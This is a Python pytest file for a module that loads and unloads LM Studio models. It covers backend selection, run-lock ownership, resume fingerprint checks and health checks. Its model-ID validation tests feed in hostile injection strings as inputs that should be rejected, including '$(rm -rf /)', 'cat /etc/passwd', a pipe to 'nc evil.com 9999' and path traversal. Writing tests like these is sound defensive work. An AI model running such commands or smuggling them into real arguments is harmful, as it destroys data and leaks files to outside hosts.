"""Tests for senex.lmstudio_lifecycle - backends, Lifecycle API, resume, doctor, threat surface.

Implements M4 Tasks 4.1-4.6 per the M4 plan.
"""
from __future__ import annotations

import sys
from pathlib import Path
from typing import Any
from unittest.mock import AsyncMock, MagicMock

import pytest

from senex.config import LifecycleCfg
from senex.events import BaseEvent
from senex.lmstudio_lifecycle import (
    FingerprintMismatch,
    InvalidModelId,
    Lifecycle,
    LifecycleBackendFactory,
    LifecycleBackendUnavailable,
    LMSCLIBackend,
    LMStudioSDKBackend,
    ModelInfo,
    ModelLoadFailed,
    ModelLoadTimeout,
    ModelNotLoaded,
    ResumedRunCannotOwnLoad,
    _compute_fingerprint,
    _resume_holder_record,
    validate_model_id,
)
from senex.runlock import RunLock
from senex.secret_redactor import SecretRedactor


# Shared fixtures -----------------------------------------------------------


class _RecordingBus:
    """Minimal EventBus stand-in that records publishes (preserves order, ignores seq)."""

    def __init__(self) -> None:
        self.published: list[BaseEvent] = []

    async def publish(self, event: BaseEvent) -> None:
        self.published.append(event)


@pytest.fixture
def recording_bus() -> _RecordingBus:
    return _RecordingBus()


@pytest.fixture
def redactor() -> SecretRedactor:
    return SecretRedactor()


def _make_info(model_id: str = "m", quant: str = "Q5", digest: str = "abc",
               backend: str = "sdk") -> ModelInfo:
    return ModelInfo(
        model_id=model_id,
        quant=quant,
        checkpoint_digest=digest,
        fingerprint=_compute_fingerprint(model_id, quant, digest),
        backend=backend,
    )


@pytest.fixture
def isolated_runlock(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> Path:
    """Redirect RunLock's default root to tmp_path so we never touch ~/.senex."""
    monkeypatch.setattr("senex.runlock._default_root", lambda: tmp_path)
    return tmp_path


# ---------------------------------------------------------------------------
# Task 4.1 - backend selection
# ---------------------------------------------------------------------------


async def test_select_prefers_sdk(monkeypatch: pytest.MonkeyPatch) -> None:
    """When the lmstudio Python SDK is reachable, select() returns LMStudioSDKBackend."""
    mock_sdk = MagicMock()
    # SDK probe is a list_loaded_models call; make it a successful no-op.
    mock_sdk.list_loaded_models = AsyncMock(return_value=[])
    monkeypatch.setitem(sys.modules, "lmstudio", mock_sdk)
    backend = await LifecycleBackendFactory.select()
    assert isinstance(backend, LMStudioSDKBackend)


async def test_select_falls_back_to_cli(monkeypatch: pytest.MonkeyPatch) -> None:
    """When the SDK import fails, fall back to the lms CLI if it's on PATH."""
    # Force ImportError for the next ``import lmstudio``.
    monkeypatch.setitem(sys.modules, "lmstudio", None)
    monkeypatch.setattr(
        "shutil.which",
        lambda name: "/usr/local/bin/lms" if name == "lms" else None,
    )
    backend = await LifecycleBackendFactory.select()
    assert isinstance(backend, LMSCLIBackend)


async def test_select_raises_when_neither_available(monkeypatch: pytest.MonkeyPatch) -> None:
    """Both backends absent -> LifecycleBackendUnavailable."""
    monkeypatch.setitem(sys.modules, "lmstudio", None)
    monkeypatch.setattr("shutil.which", lambda name: None)
    with pytest.raises(LifecycleBackendUnavailable, match="neither lmstudio Python SDK nor lms CLI"):
        await LifecycleBackendFactory.select()


async def test_select_falls_back_when_sdk_unreachable(monkeypatch: pytest.MonkeyPatch) -> None:
    """SDK importable but list_loaded_models raises -> fall back to CLI when present."""
    mock_sdk = MagicMock()
    mock_sdk.list_loaded_models = AsyncMock(side_effect=ConnectionError("server down"))
    monkeypatch.setitem(sys.modules, "lmstudio", mock_sdk)
    monkeypatch.setattr(
        "shutil.which",
        lambda name: "/usr/local/bin/lms" if name == "lms" else None,
    )
    backend = await LifecycleBackendFactory.select()
    assert isinstance(backend, LMSCLIBackend)


async def test_both_backends_produce_same_fingerprint() -> None:
    """SDK and CLI backends MUST agree on fingerprint computation (spec section 9 row 34)."""
    triple = ("google/gemma-4-26b-a4b", "Q5_K_M", "abcdef0123456789")
    fp_sdk = _compute_fingerprint(*triple)
    fp_cli = _compute_fingerprint(*triple)
    info_sdk = ModelInfo(
        model_id=triple[0],
        quant=triple[1],
        checkpoint_digest=triple[2],
        fingerprint=fp_sdk,
        backend="sdk",
    )
    info_cli = ModelInfo(
        model_id=triple[0],
        quant=triple[1],
        checkpoint_digest=triple[2],
        fingerprint=fp_cli,
        backend="cli",
    )
    assert info_sdk.fingerprint == info_cli.fingerprint


async def test_modelinfo_extra_forbidden() -> None:
    """ModelInfo is pydantic v2 strict; unknown keys raise."""
    with pytest.raises(Exception):  # noqa: BLE001
        ModelInfo(  # type: ignore[call-arg]
            model_id="m",
            quant="Q5",
            checkpoint_digest="abc",
            fingerprint="fp",
            backend="sdk",
            unknown_field="oops",
        )


# ---------------------------------------------------------------------------
# Task 4.2 - Lifecycle.acquire / Lifecycle.release
# ---------------------------------------------------------------------------


async def test_acquire_loads_when_auto_load_true(
    recording_bus: _RecordingBus,
    redactor: SecretRedactor,
    isolated_runlock: Path,
) -> None:
    backend = MagicMock()
    backend.is_loaded = AsyncMock(return_value=False)
    info = _make_info()
    backend.load = AsyncMock(return_value=info)
    cfg = LifecycleCfg(auto_load=True, load_timeout_seconds=120)
    lc = Lifecycle(backend, recording_bus, cfg, redactor)
    out_info, loaded_by_us = await lc.acquire("m", "run-1", RunLock, auto_load=True)
    assert loaded_by_us is True
    assert out_info.fingerprint == info.fingerprint
    backend.load.assert_awaited_once_with("m", timeout=120)
    types = [e.type for e in recording_bus.published]
    assert types == [
        "ModelLoadRequested",
        "ModelLoadStarted",
        "ModelLoadComplete",
        "RunLockAcquired",
    ]
    # Cleanup the runlock so other tests start fresh.
    await lc.release("m", "run-1", RunLock, auto_unload=False, loaded_by_us=True)


async def test_acquire_raises_model_not_loaded_when_auto_load_false(
    recording_bus: _RecordingBus,
    redactor: SecretRedactor,
    isolated_runlock: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    backend = MagicMock()
    backend.is_loaded = AsyncMock(return_value=False)
    cfg = LifecycleCfg(auto_load=False)
    lc = Lifecycle(backend, recording_bus, cfg, redactor)
    runlock_acquire = MagicMock()
    monkeypatch.setattr("senex.runlock.RunLock.acquire", runlock_acquire)
    with pytest.raises(ModelNotLoaded):
        await lc.acquire("m", "run-1", RunLock, auto_load=False)
    runlock_acquire.assert_not_called()


async def test_acquire_attaches_when_already_loaded(
    recording_bus: _RecordingBus,
    redactor: SecretRedactor,
    isolated_runlock: Path,
) -> None:
    backend = MagicMock()
    info = _make_info()
    backend.is_loaded = AsyncMock(return_value=True)
    backend.load = AsyncMock()  # MUST NOT be called
    backend.list_loaded = AsyncMock(return_value=[info])
    cfg = LifecycleCfg(auto_load=True)
    lc = Lifecycle(backend, recording_bus, cfg, redactor)
    out_info, loaded_by_us = await lc.acquire("m", "run-1", RunLock, auto_load=True)
    assert loaded_by_us is False
    assert out_info.fingerprint == info.fingerprint
    backend.load.assert_not_called()
    types = [e.type for e in recording_bus.published]
    assert types == ["RunLockAcquired"]
    runlock_event = recording_bus.published[-1]
    # The pydantic event has a model_fingerprint field but no loaded_by_us; the
    # contract simply states acquire returned False here. Verify via tuple shape.
    assert getattr(runlock_event, "model_fingerprint") == info.fingerprint
    await lc.release("m", "run-1", RunLock, auto_unload=False, loaded_by_us=False)


async def test_release_unloads_when_count_zero_and_we_loaded_and_auto_unload(
    recording_bus: _RecordingBus,
    redactor: SecretRedactor,
    isolated_runlock: Path,
) -> None:
    backend = MagicMock()
    info = _make_info()
    backend.is_loaded = AsyncMock(return_value=False)
    backend.load = AsyncMock(return_value=info)
    backend.unload = AsyncMock()
    cfg = LifecycleCfg(auto_load=True, auto_unload=True)
    lc = Lifecycle(backend, recording_bus, cfg, redactor)
    _info, loaded_by_us = await lc.acquire("m", "run-1", RunLock, auto_load=True)
    recording_bus.published.clear()
    await lc.release("m", "run-1", RunLock, auto_unload=True, loaded_by_us=loaded_by_us)
    backend.unload.assert_awaited_once_with("m")
    types = [e.type for e in recording_bus.published]
    assert types == ["RunLockReleased", "ModelUnloadStarted", "ModelUnloadComplete"]


async def test_release_skips_unload_when_concurrent_holders(
    recording_bus: _RecordingBus,
    redactor: SecretRedactor,
    isolated_runlock: Path,
) -> None:
    backend = MagicMock()
    info = _make_info()
    backend.is_loaded = AsyncMock(return_value=False)
    backend.load = AsyncMock(return_value=info)
    backend.unload = AsyncMock()
    cfg = LifecycleCfg(auto_load=True, auto_unload=True)
    lc = Lifecycle(backend, recording_bus, cfg, redactor)
    # Acquire twice -> two holders -> first release leaves count 1.
    await lc.acquire("m", "run-1", RunLock, auto_load=True)
    await lc.acquire("m", "run-2", RunLock, auto_load=True)
    recording_bus.published.clear()
    await lc.release("m", "run-1", RunLock, auto_unload=True, loaded_by_us=True)
    backend.unload.assert_not_called()
    types = [e.type for e in recording_bus.published]
    assert "ModelUnloadSkipped" in types
    skipped = [e for e in recording_bus.published if e.type == "ModelUnloadSkipped"]
    assert getattr(skipped[0], "reason") == "concurrent_holders"
    # Cleanup.
    await lc.release("m", "run-2", RunLock, auto_unload=False, loaded_by_us=False)


async def test_release_skips_unload_when_not_loaded_by_us(
    recording_bus: _RecordingBus,
    redactor: SecretRedactor,
    isolated_runlock: Path,
) -> None:
    backend = MagicMock()
    info = _make_info()
    backend.is_loaded = AsyncMock(return_value=True)
    backend.list_loaded = AsyncMock(return_value=[info])
    backend.unload = AsyncMock()
    cfg = LifecycleCfg(auto_load=True, auto_unload=True)
    lc = Lifecycle(backend, recording_bus, cfg, redactor)
    _info, loaded_by_us = await lc.acquire("m", "run-1", RunLock, auto_load=True)
    assert loaded_by_us is False
    recording_bus.published.clear()
    await lc.release("m", "run-1", RunLock, auto_unload=True, loaded_by_us=False)
    backend.unload.assert_not_called()
    skipped = [e for e in recording_bus.published if e.type == "ModelUnloadSkipped"]
    assert getattr(skipped[0], "reason") == "not_loaded_by_us"


async def test_release_skips_unload_when_auto_unload_disabled(
    recording_bus: _RecordingBus,
    redactor: SecretRedactor,
    isolated_runlock: Path,
) -> None:
    backend = MagicMock()
    info = _make_info()
    backend.is_loaded = AsyncMock(return_value=False)
    backend.load = AsyncMock(return_value=info)
    backend.unload = AsyncMock()
    cfg = LifecycleCfg(auto_load=True, auto_unload=False)
    lc = Lifecycle(backend, recording_bus, cfg, redactor)
    _info, loaded_by_us = await lc.acquire("m", "run-1", RunLock, auto_load=True)
    recording_bus.published.clear()
    await lc.release("m", "run-1", RunLock, auto_unload=False, loaded_by_us=True)
    backend.unload.assert_not_called()
    skipped = [e for e in recording_bus.published if e.type == "ModelUnloadSkipped"]
    assert getattr(skipped[0], "reason") == "auto_unload_disabled"


async def test_load_timeout_raises_and_does_not_acquire_runlock(
    recording_bus: _RecordingBus,
    redactor: SecretRedactor,
    isolated_runlock: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    backend = MagicMock()
    backend.is_loaded = AsyncMock(return_value=False)

    async def slow_load(_mid: str, timeout: int) -> ModelInfo:
        await __import__("asyncio").sleep(10)
        return _make_info()

    backend.load = slow_load
    cfg = LifecycleCfg(auto_load=True, load_timeout_seconds=1)
    lc = Lifecycle(backend, recording_bus, cfg, redactor)
    runlock_acquire = MagicMock()
    monkeypatch.setattr("senex.runlock.RunLock.acquire", runlock_acquire)
    with pytest.raises(ModelLoadTimeout):
        await lc.acquire("m", "run-1", RunLock, auto_load=True)
    runlock_acquire.assert_not_called()
    failed = [e for e in recording_bus.published if e.type == "ModelLoadFailed"]
    assert getattr(failed[0], "error_kind") == "timeout"


async def test_load_failure_raises_and_does_not_acquire_runlock(
    recording_bus: _RecordingBus,
    redactor: SecretRedactor,
    isolated_runlock: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    backend = MagicMock()
    backend.is_loaded = AsyncMock(return_value=False)
    backend.load = AsyncMock(side_effect=RuntimeError("GPU OOM"))
    cfg = LifecycleCfg(auto_load=True)
    lc = Lifecycle(backend, recording_bus, cfg, redactor)
    runlock_acquire = MagicMock()
    monkeypatch.setattr("senex.runlock.RunLock.acquire", runlock_acquire)
    with pytest.raises(ModelLoadFailed):
        await lc.acquire("m", "run-1", RunLock, auto_load=True)
    runlock_acquire.assert_not_called()
    failed = [e for e in recording_bus.published if e.type == "ModelLoadFailed"]
    assert getattr(failed[0], "error_kind") == "load_failed"


async def test_unload_failure_logs_warn_does_not_raise(
    recording_bus: _RecordingBus,
    redactor: SecretRedactor,
    isolated_runlock: Path,
) -> None:
    backend = MagicMock()
    info = _make_info()
    backend.is_loaded = AsyncMock(return_value=False)
    backend.load = AsyncMock(return_value=info)
    backend.unload = AsyncMock(side_effect=RuntimeError("VRAM stuck"))
    cfg = LifecycleCfg(auto_load=True, auto_unload=True)
    lc = Lifecycle(backend, recording_bus, cfg, redactor)
    _info, loaded_by_us = await lc.acquire("m", "run-1", RunLock, auto_load=True)
    recording_bus.published.clear()
    # Must not raise.
    await lc.release("m", "run-1", RunLock, auto_unload=True, loaded_by_us=loaded_by_us)
    types = [e.type for e in recording_bus.published]
    assert "ModelUnloadFailed" in types



# ---------------------------------------------------------------------------
# Task 4.3 - Resume integration (spec section 5.5.2.7)
# ---------------------------------------------------------------------------


async def test_resume_attached_fingerprint_match(
    recording_bus: _RecordingBus,
    redactor: SecretRedactor,
    isolated_runlock: Path,
) -> None:
    """Spec 5.5.2.7 row 1: model still loaded, fp matches checkpoint -> attach as not-owner."""
    backend = MagicMock()
    info = _make_info()
    backend.is_loaded = AsyncMock(return_value=True)
    backend.list_loaded = AsyncMock(return_value=[info])
    backend.unload = AsyncMock()
    cfg = LifecycleCfg(auto_load=True, auto_unload=True, allow_mixed=False)
    lc = Lifecycle(backend, recording_bus, cfg, redactor)
    out_info = await lc.acquire_for_resume(
        "m", "run-1", RunLock,
        checkpoint_fingerprint=info.fingerprint, allow_mixed=False,
    )
    assert out_info.fingerprint == info.fingerprint
    types = [e.type for e in recording_bus.published]
    assert "RunLockAcquired" in types
    holders = RunLock.list_holders(info.fingerprint)
    assert len(holders) == 1
    assert holders[0]["loaded_by_us"] is False
    recording_bus.published.clear()
    await lc.release(
        "m", "run-1", RunLock,
        auto_unload=True, loaded_by_us=False, resumed=True,
    )
    backend.unload.assert_not_called()
    skipped = [e for e in recording_bus.published if e.type == "ModelUnloadSkipped"]
    assert getattr(skipped[0], "reason") == "resumed_run_does_not_own_load"


async def test_resume_external_unload_then_reload_still_not_owned(
    recording_bus: _RecordingBus,
    redactor: SecretRedactor,
    isolated_runlock: Path,
) -> None:
    """Spec 5.5.2.7 row 2: model was unloaded externally; resume re-loads but loaded_by_us=False."""
    backend = MagicMock()
    info = _make_info()
    backend.is_loaded = AsyncMock(return_value=False)
    backend.load = AsyncMock(return_value=info)
    backend.unload = AsyncMock()
    cfg = LifecycleCfg(auto_load=True, auto_unload=True, allow_mixed=False)
    lc = Lifecycle(backend, recording_bus, cfg, redactor)
    out_info = await lc.acquire_for_resume(
        "m", "run-1", RunLock,
        checkpoint_fingerprint=info.fingerprint, allow_mixed=False,
    )
    assert out_info.fingerprint == info.fingerprint
    backend.load.assert_awaited_once()
    holders = RunLock.list_holders(info.fingerprint)
    assert len(holders) == 1
    assert holders[0]["loaded_by_us"] is False
    recording_bus.published.clear()
    await lc.release(
        "m", "run-1", RunLock,
        auto_unload=True, loaded_by_us=False, resumed=True,
    )
    backend.unload.assert_not_called()
    skipped = [e for e in recording_bus.published if e.type == "ModelUnloadSkipped"]
    assert getattr(skipped[0], "reason") == "resumed_run_does_not_own_load"


async def test_resume_fingerprint_mismatch_refuses(
    recording_bus: _RecordingBus,
    redactor: SecretRedactor,
    isolated_runlock: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Spec 5.5.2.7 row 3: probed fp != checkpoint fp + not allow_mixed -> FingerprintMismatch
    raised BEFORE runlock.acquire is touched."""
    backend = MagicMock()
    probed = _make_info(model_id="m", quant="Q5", digest="abc")
    backend.is_loaded = AsyncMock(return_value=True)
    backend.list_loaded = AsyncMock(return_value=[probed])
    cfg = LifecycleCfg(auto_load=True, allow_mixed=False)
    lc = Lifecycle(backend, recording_bus, cfg, redactor)
    runlock_acquire = MagicMock()
    monkeypatch.setattr("senex.runlock.RunLock.acquire", runlock_acquire)
    bogus_fp = "sha256:totallydifferent"
    with pytest.raises(FingerprintMismatch):
        await lc.acquire_for_resume(
            "m", "run-1", RunLock,
            checkpoint_fingerprint=bogus_fp, allow_mixed=False,
        )
    runlock_acquire.assert_not_called()


async def test_resume_fingerprint_mismatch_allow_mixed_proceeds(
    recording_bus: _RecordingBus,
    redactor: SecretRedactor,
    isolated_runlock: Path,
) -> None:
    """allow_mixed=True -> proceed; emit ModelFingerprintChanged with expected/observed fields."""
    backend = MagicMock()
    probed = _make_info(model_id="m", quant="Q5", digest="abc")
    backend.is_loaded = AsyncMock(return_value=True)
    backend.list_loaded = AsyncMock(return_value=[probed])
    cfg = LifecycleCfg(auto_load=True, allow_mixed=True)
    lc = Lifecycle(backend, recording_bus, cfg, redactor)
    bogus_fp = "sha256:totallydifferent"
    out_info = await lc.acquire_for_resume(
        "m", "run-1", RunLock,
        checkpoint_fingerprint=bogus_fp, allow_mixed=True,
    )
    assert out_info.fingerprint == probed.fingerprint
    holders = RunLock.list_holders(probed.fingerprint)
    assert len(holders) == 1
    assert holders[0]["loaded_by_us"] is False
    types = [e.type for e in recording_bus.published]
    assert "ModelFingerprintChanged" in types
    chg = next(e for e in recording_bus.published if e.type == "ModelFingerprintChanged")
    assert getattr(chg, "expected_fingerprint") == bogus_fp
    assert getattr(chg, "observed_fingerprint") == probed.fingerprint
    await lc.release(
        "m", "run-1", RunLock,
        auto_unload=False, loaded_by_us=False, resumed=True,
    )


async def test_resume_two_concurrent_dead_runs_pruned(
    recording_bus: _RecordingBus,
    redactor: SecretRedactor,
    isolated_runlock: Path,
) -> None:
    """Spec 5.5.2.7 row 4: pre-existing dead-PID holders are pruned on resume acquire."""
    import json as _json
    import os as _os
    from senex.runlock import _lock_path

    info = _make_info()
    fp = info.fingerprint
    lock = _lock_path(fp, isolated_runlock)
    isolated_runlock.mkdir(parents=True, exist_ok=True)
    lock.write_text(
        _json.dumps({
            "schema_version": 1,
            "model_id": "m",
            "model_fingerprint": fp,
            "holders": [
                {"run_id": "dead-1", "pid": 999998, "started_at": "2026-04-26T00:00:00Z",
                 "loaded_by_us": True},
                {"run_id": "dead-2", "pid": 999999, "started_at": "2026-04-26T00:00:00Z",
                 "loaded_by_us": False},
            ],
        }),
        encoding="utf-8",
    )

    backend = MagicMock()
    backend.is_loaded = AsyncMock(return_value=True)
    backend.list_loaded = AsyncMock(return_value=[info])
    cfg = LifecycleCfg(auto_load=True, allow_mixed=False)
    lc = Lifecycle(backend, recording_bus, cfg, redactor)
    await lc.acquire_for_resume(
        "m", "run-resumed", RunLock,
        checkpoint_fingerprint=fp, allow_mixed=False,
    )
    holders = RunLock.list_holders(fp)
    assert len(holders) == 1
    assert holders[0]["run_id"] == "run-resumed"
    assert holders[0]["pid"] == _os.getpid()
    assert holders[0]["loaded_by_us"] is False


def test_resume_cannot_set_loaded_by_us_true() -> None:
    """Defense-in-depth: internal helper refuses loaded_by_us=True for a resumed holder."""
    info = _make_info()
    with pytest.raises(ResumedRunCannotOwnLoad):
        _resume_holder_record(info, run_id="r", loaded_by_us=True)



# ---------------------------------------------------------------------------
# Task 4.6 - Threat-surface validation (model_id regex)
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("bad_id", [
    "$(rm -rf /)",
    "model;ls",
    "model && cat /etc/passwd",
    "model`whoami`",
    "model|nc evil.com 9999",
    "../../../etc/passwd",
    "model with space",
    "model\nrm -rf /",
    "model\x00",
    "",
    "x" * 300,
])
def test_validate_model_id_rejects(bad_id: str) -> None:
    with pytest.raises(InvalidModelId):
        validate_model_id(bad_id)


@pytest.mark.parametrize("good_id", [
    "google/gemma-4-26b-a4b",
    "lmstudio-community/Qwen2.5-32B-Instruct",
    "model-v1.0",
    "model_with_underscore",
    "model.with.dots",
])
def test_validate_model_id_accepts(good_id: str) -> None:
    assert validate_model_id(good_id) == good_id


async def test_cli_backend_load_validates_before_subprocess(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    mock_proc = AsyncMock()
    monkeypatch.setattr("asyncio.create_subprocess_exec", mock_proc)
    backend = LMSCLIBackend()
    with pytest.raises(InvalidModelId):
        await backend.load("$(rm -rf /)", timeout=120)
    mock_proc.assert_not_called()


async def test_cli_backend_unload_validates_before_subprocess(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    mock_proc = AsyncMock()
    monkeypatch.setattr("asyncio.create_subprocess_exec", mock_proc)
    backend = LMSCLIBackend()
    with pytest.raises(InvalidModelId):
        await backend.unload("$(rm -rf /)")
    mock_proc.assert_not_called()


async def test_sdk_backend_load_validates_before_call() -> None:
    mock_sdk = MagicMock()
    mock_sdk.llm = AsyncMock()
    backend = LMStudioSDKBackend(mock_sdk)
    with pytest.raises(InvalidModelId):
        await backend.load("$(rm -rf /)", timeout=120)
    mock_sdk.llm.assert_not_called()


async def test_subprocess_uses_list_form_and_shell_false(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Spec 5.5.2.6: list-form argv, shell=False, no metachars in any element."""
    calls: list[tuple[Any, ...]] = []

    async def fake_exec(*args: Any, **kwargs: Any) -> Any:
        calls.append((args, kwargs))
        proc = MagicMock()
        proc.communicate = AsyncMock(return_value=(
            b'{"model_id":"google/gemma-4-26b-a4b","quant":"Q5","digest":"abc"}',
            b"",
        ))
        proc.returncode = 0
        return proc

    monkeypatch.setattr("asyncio.create_subprocess_exec", fake_exec)
    backend = LMSCLIBackend()
    await backend.load("google/gemma-4-26b-a4b", timeout=120)
    args, kwargs = calls[0]
    assert args[0] == "lms"
    assert args[1] == "load"
    assert args[2] == "google/gemma-4-26b-a4b"
    assert "shell" not in kwargs or kwargs["shell"] is False
    assert all(isinstance(a, str) and ";" not in a and "&" not in a for a in args)



# ---------------------------------------------------------------------------
# Task 4.5 - Doctor lifecycle backend check (spec section 8.1)
# ---------------------------------------------------------------------------


async def test_doctor_fail_when_auto_load_and_no_backend(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """auto_load=True + no backend -> status='fail'."""
    from senex.config import LifecycleCfg, SenexConfig
    from senex.lmstudio_lifecycle import (
        DoctorCheck,
        LifecycleBackendUnavailable,
        doctor_check_lifecycle_backend,
    )

    monkeypatch.setattr(
        "senex.lmstudio_lifecycle.LifecycleBackendFactory.select",
        AsyncMock(side_effect=LifecycleBackendUnavailable("no backend")),
    )
    cfg = SenexConfig()
    cfg.lmstudio.lifecycle = LifecycleCfg(auto_load=True)
    result: DoctorCheck = await doctor_check_lifecycle_backend(cfg)
    assert result.name == "lmstudio_lifecycle_backend"
    assert result.status == "fail"


async def test_doctor_warn_when_no_backend_but_auto_load_false(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """auto_load=False + no backend -> status='warn' (run can still attach)."""
    from senex.config import LifecycleCfg, SenexConfig
    from senex.lmstudio_lifecycle import (
        LifecycleBackendUnavailable,
        doctor_check_lifecycle_backend,
    )

    monkeypatch.setattr(
        "senex.lmstudio_lifecycle.LifecycleBackendFactory.select",
        AsyncMock(side_effect=LifecycleBackendUnavailable("no backend")),
    )
    cfg = SenexConfig()
    cfg.lmstudio.lifecycle = LifecycleCfg(auto_load=False)
    result = await doctor_check_lifecycle_backend(cfg)
    assert result.status == "warn"


async def test_doctor_pass_when_backend_available(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Backend reachable -> status='pass', message names which backend."""
    from senex.config import LifecycleCfg, SenexConfig
    from senex.lmstudio_lifecycle import (
        LMStudioSDKBackend,
        doctor_check_lifecycle_backend,
    )

    fake_backend = MagicMock(spec=LMStudioSDKBackend)
    fake_backend.backend_name = "sdk"
    monkeypatch.setattr(
        "senex.lmstudio_lifecycle.LifecycleBackendFactory.select",
        AsyncMock(return_value=fake_backend),
    )
    cfg = SenexConfig()
    cfg.lmstudio.lifecycle = LifecycleCfg(auto_load=True)
    result = await doctor_check_lifecycle_backend(cfg)
    assert result.status == "pass"
    assert "sdk" in result.message.lower()
